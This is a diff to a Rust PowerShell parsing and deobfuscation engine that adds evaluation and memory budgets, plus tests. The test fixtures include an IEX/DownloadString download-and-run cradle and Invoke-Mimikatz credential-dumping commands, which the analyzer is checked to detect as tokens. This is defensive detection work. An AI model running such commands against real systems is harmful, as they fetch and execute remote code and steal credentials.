@@ -104,7 +104,9 @@ impl StackBase {
         let outermost = STACK_BASE.with(|base| base.get().is_none());
         if outermost {
             let here = &here as *const u8 as usize;
-            let base = stack_low().map_or(here, |low| here.max(low + STACK_RESERVE + STACK_BUDGET));
+            let base = stack_low().map_or(here, |low| {
+                here.max(low.saturating_add(STACK_RESERVE + STACK_BUDGET))
+            });
             STACK_BASE.with(|b| b.set(Some(base)));
             EVAL_STEPS.set(0);
             MEM_USED.set(0);
@@ -152,6 +154,13 @@ thread_local! {
 
 fn deadline_passed() -> bool {
     DEADLINE.get().is_some_and(|d| std::time::Instant::now() > d)
+}
+
+pub(crate) fn over_budget(err: &ParserError) -> bool {
+    matches!(
+        err,
+        ParserError::EvalBudgetExceeded | ParserError::ParseBudgetExceeded
+    )
 }
 
 fn eval_step() -> ParserResult<()> {
@@ -280,6 +289,10 @@ pub(crate) fn parse_step<T>(state: T) -> Result<T, T> {
 }
 
 fn parse_program(input: &str) -> ParserResult<Pairs<'_>> {
+    // only nested parses during evaluation start after the deadline
+    if deadline_passed() {
+        return Err(ParserError::EvalBudgetExceeded);
+    }
     PARSE_STEPS.set(0);
     let budget =
         PARSE_STEPS_BASE.saturating_add(PARSE_STEPS_PER_BYTE.saturating_mul(input.len() as u64));
@@ -614,6 +627,11 @@ impl<'a> PowerShellSession {
                         }
 
                         val
+                    }
+                    // a nested script stops, so loops over its result stop too
+                    Err(e) if over_budget(&e) && self.results.len() > 1 => {
+                        self.results.pop();
+                        return Err(e);
                     }
                     Err(e) => {
                         self.errors.push(e);
@@ -1116,6 +1134,7 @@ impl<'a> PowerShellSession {
                 _ => Ok(token.as_str().to_string()),
             };
             match res {
+                Ok(s) if !charge(s.len()) => return Err(ParserError::EvalBudgetExceeded),
                 Ok(s) => res_str.push_str(s.as_str()),
                 Err(err) => {
                     self.errors.push(err);
@@ -1174,7 +1193,6 @@ impl<'a> PowerShellSession {
                 var_name.name,
             )));
         };
-        charge_val(&var)?;
         Ok(var)
     }
 
@@ -1917,6 +1935,8 @@ impl<'a> PowerShellSession {
 
         arr.push(self.safe_parse_arg(token)?);
         for token in pairs {
+            // each copy is charged before the next one is made
+            charge_val(&arr[arr.len() - 1])?;
             arr.push(self.safe_parse_arg(token)?);
         }
 
@@ -2104,6 +2124,7 @@ impl<'a> PowerShellSession {
         // filtered_elements.join("")
         for ch in characters {
             let b = match script_block.run(vec![], self, Some(Val::String(ch.to_string().into()))) {
+                Err(er) if over_budget(&er) => return Err(er),
                 Err(er) => {
                     self.errors.push(er);
                     false
@@ -2342,6 +2363,7 @@ impl<'a> PowerShellSession {
                         _ => Ok(Val::ScriptText(arg_token.as_str().to_string())),
                     };
                     // an argument that cannot be evaluated, e.g. an unknown variable, stays as text
+                    let arg = arg.and_then(|arg| charge_val(&arg).map(|()| arg));
                     let arg = arg.unwrap_or_else(|err| {
                         self.errors.push(err);
                         Val::ScriptText(arg_token.as_str().to_string())
@@ -2415,6 +2437,7 @@ impl<'a> PowerShellSession {
                 val,
                 deobfuscated: _deobfuscated,
             }) => Ok(val),
+            Err(e) if over_budget(&e) => Err(e),
             Err(e) => {
                 self.errors.push(e);
                 Ok(Val::ScriptText(command.to_string()))
@@ -2508,6 +2531,7 @@ impl<'a> PowerShellSession {
             .push(Token::expression(token_string, res.clone().into()));
 
         if let Val::String(value::PsString(s)) = &res {
+            charge_val(&res)?;
             self.tokens.push(Token::String(s.clone()));
         }
 
@@ -2601,7 +2625,11 @@ impl<'a> PowerShellSession {
             specified_type = Some(self.eval_type_literal(token)?);
             token = pairs.next().unwrap();
         }
-        let (var_name, access) = self.parse_assignable_variable(token)?;
+        // an unresolved target is not assigned, but the right side still gives tokens
+        let (var_name, access) = match self.parse_assignable_variable(token) {
+            Ok(target) => target,
+            Err(err) => return self.eval_statement(pairs.nth(1).unwrap()).and(Err(err)),
+        };
         let mut variable = self
             .variables
             .get(&var_name, &self.types_map)
@@ -2612,7 +2640,10 @@ impl<'a> PowerShellSession {
         // property by reference
         if let Some(access) = access {
             for token in access {
-                accessed_elem = self.variable_access(token, accessed_elem)?;
+                accessed_elem = match self.variable_access(token, accessed_elem) {
+                    Ok(elem) => elem,
+                    Err(err) => return self.eval_statement(pairs.nth(1).unwrap()).and(Err(err)),
+                };
             }
         }
         let assignement_op = pairs.next().unwrap();
@@ -2922,7 +2953,7 @@ $ilryNQSTt="System.$([cHAR]([ByTE]0x4d)+[ChAR]([byte]0x61)+[chAr](110)+[cHar]([b
 
         let start = std::time::Instant::now();
         let hit_budget = match PowerShellSession::new().parse_command(&script) {
-            Ok(res) => res.errors().contains(&ParserError::EvalBudgetExceeded),
+            Ok(res) => res.errors().iter().any(over_budget),
             // a loaded machine can run out of time already in the top-level parse
             Err(err) => err == ParserError::ParseBudgetExceeded,
         };
@@ -3005,6 +3036,128 @@ $ilryNQSTt="System.$([cHAR]([ByTE]0x4d)+[ChAR]([byte]0x61)+[chAr](110)+[cHar]([b
                 &script[..60],
                 start.elapsed()
             );
+        }
+    }
+
+    #[test]
+    fn unresolved_assignment_target_keeps_rhs_tokens() {
+        for (script, func, string) in [
+            (
+                "[Console]::Title = IEX (New-Object Net.WebClient).DownloadString('http://x'); \
+                 'next'",
+                "iex",
+                "http://x",
+            ),
+            (
+                "[Console]::Title = Invoke-Mimikatz -DumpCreds; 'next'",
+                "invoke-mimikatz",
+                "next",
+            ),
+            (
+                "$h = @{}; $h.k = Invoke-Mimikatz 'arg'; 'next'",
+                "invoke-mimikatz",
+                "arg",
+            ),
+        ] {
+            let res = PowerShellSession::new().parse_script(script).unwrap();
+            let tokens = res.tokens();
+            let funcs = tokens.methods_and_commands();
+            assert!(
+                funcs.iter().any(|f| f.eq_ignore_ascii_case(func)),
+                "{script}: {funcs:?}"
+            );
+            assert!(tokens.lowercased_string_set().contains(string), "{script}");
+            assert_eq!(res.result().to_string(), "next", "{script}");
+        }
+    }
+
+    #[test]
+    fn pipeline_loops_stop_at_eval_budget() {
+        let xor = format!(
+            "$s = '{}'; $d = -join (0..($s.Length-1) | % {{ [char]([int][char]$s[$_] -bxor 7) \
+             }}); 1",
+            "x".repeat(50_000)
+        );
+        for script in [
+            "0..999999 | % { 1 }",
+            "0..999999 | ? { 1 }",
+            "('a' * 1000000) -split { $_ -eq 'b' }",
+            &xor,
+        ] {
+            let start = std::time::Instant::now();
+            let res = PowerShellSession::new().parse_script(script).unwrap();
+            assert!(
+                res.errors().iter().any(over_budget),
+                "{script:.40}: {:?}",
+                res.errors()
+            );
+            assert!(
+                start.elapsed().as_secs_f64() < 2.5,
+                "{script:.40}: {:?}",
+                start.elapsed()
+            );
+        }
+        let mut ps = PowerShellSession::new();
+        assert_eq!(
+            ps.safe_eval("1..3 | % { $_ * 2 }").unwrap(),
+            ["2", "4", "6"].join(NEWLINE)
+        );
+        assert_eq!(
+            ps.safe_eval("1..5 | ? { $_ -gt 3 }").unwrap(),
+            ["4", "5"].join(NEWLINE)
+        );
+    }
+
+    #[test]
+    fn decode_loops_keep_trailing_tokens() {
+        // the loops read more than the memory budget, but keep little in tokens
+        for script in [
+            "$s = 'x' * 400000; $d = 0..199 | % { $s.Substring(($_ * 4), 4) }; Invoke-Mimikatz",
+            "$s = 'x' * 1000000; 1..200 | % { $n = $s.Length }; Invoke-Mimikatz",
+        ] {
+            let res = PowerShellSession::new().parse_script(script).unwrap();
+            let found = res
+                .tokens()
+                .methods_and_commands()
+                .contains("Invoke-Mimikatz");
+            assert!(found, "{script:.60}: {:?}", res.errors());
+        }
+    }
+
+    #[test]
+    fn huge_replace_and_join_sizes_hit_memory_budget() {
+        // both sizes are exactly 2^32 and wrapped to 0 on 32-bit targets
+        for script in [
+            "$s = 'a' * 1048576; $r = $s.Replace('a', ('b' * 4096)); 1",
+            "$r = (@(1) * 256) -join ('x' * 16777215); 1",
+        ] {
+            let start = std::time::Instant::now();
+            let res = PowerShellSession::new().parse_script(script).unwrap();
+            assert!(
+                res.errors().contains(&ParserError::EvalBudgetExceeded),
+                "{script}: {:?}",
+                res.errors()
+            );
+            assert!(
+                start.elapsed().as_secs() < 10,
+                "{script}: {:?}",
+                start.elapsed()
+            );
+        }
+    }
+
+    #[test]
+    fn filtered_single_element_array_is_its_element_in_if() {
+        let mut ps = PowerShellSession::new();
+        for (cond, expected) in [
+            ("@(0,1) -eq 0", "else"),
+            ("@('','a') -eq ''", "else"),
+            ("@(1,2) -eq 1", "then"),
+            ("@(0,0) -eq 0", "then"),
+            ("@(1,2) -eq 3", "else"),
+        ] {
+            let script = format!("if ({cond}) {{ 'then' }} else {{ 'else' }}");
+            assert_eq!(ps.safe_eval(&script).unwrap(), expected, "{cond}");
         }
     }
 }
